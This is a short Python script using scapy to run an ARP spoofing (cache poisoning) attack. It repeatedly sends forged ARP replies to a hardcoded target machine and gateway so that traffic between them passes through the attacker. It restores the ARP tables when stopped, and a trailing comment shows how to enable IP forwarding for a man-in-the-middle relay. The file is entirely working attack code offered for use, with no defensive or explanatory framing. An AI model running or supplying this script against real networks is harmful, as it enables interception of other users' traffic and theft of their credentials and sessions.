#!/usr/bin/python3

from scapy.all import *
import time


def spoofarpcache(targetip, targetmac, sourceip):
	spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
	send(spoofed, verbose=False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
	packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
	send(packet, verbose=False)
	print ("ARP Table restored to normal for", targetip)


def main():
	targetip= "192.168.6.11"
	gatewayip= "192.168.6.1"

	try:
		targetmac= getmacbyip(targetip)
		print ("Target MAC", targetmac)
	except:
		print ("Target machine did not respond to ARP broadcast")
		quit()

	try:
		gatewaymac= getmacbyip(gatewayip)
		print ("Gateway MAC:", gatewaymac)
	except:
		print ("Gateway is unreachable")
		quit()
		
	try:
		print ("Sending spoofed ARP responses")
		while True:
			spoofarpcache(targetip, targetmac, gatewayip)
			spoofarpcache(gatewayip, gatewaymac, targetip)
			time.sleep(1)
			
			 
	finally:
		print ("ARP spoofing stopped")
		restorearp(gatewayip, gatewaymac, targetip, targetmac)
		restorearp(targetip, targetmac, gatewayip, gatewaymac)
		quit()

if __name__=="__main__":
	main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
